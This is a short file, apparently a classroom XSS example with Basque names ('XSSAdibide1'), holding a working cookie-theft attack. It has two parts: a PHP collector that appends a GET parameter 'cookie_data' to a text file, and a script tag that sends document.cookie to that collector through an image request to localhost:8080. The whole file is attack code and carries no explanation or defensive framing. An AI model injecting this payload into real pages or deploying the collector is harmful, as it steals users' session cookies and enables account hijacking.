<?php
    $datua= $_GET['cookie_data'];
    File_put_contents("informazioa.txt", $datua, FILE_APPEND);
?>

<script type="text/javascript">
new Image().src="http://localhost:8080/XSSAdibide1/prest.php?cookie_data="+document.cookie;
</script>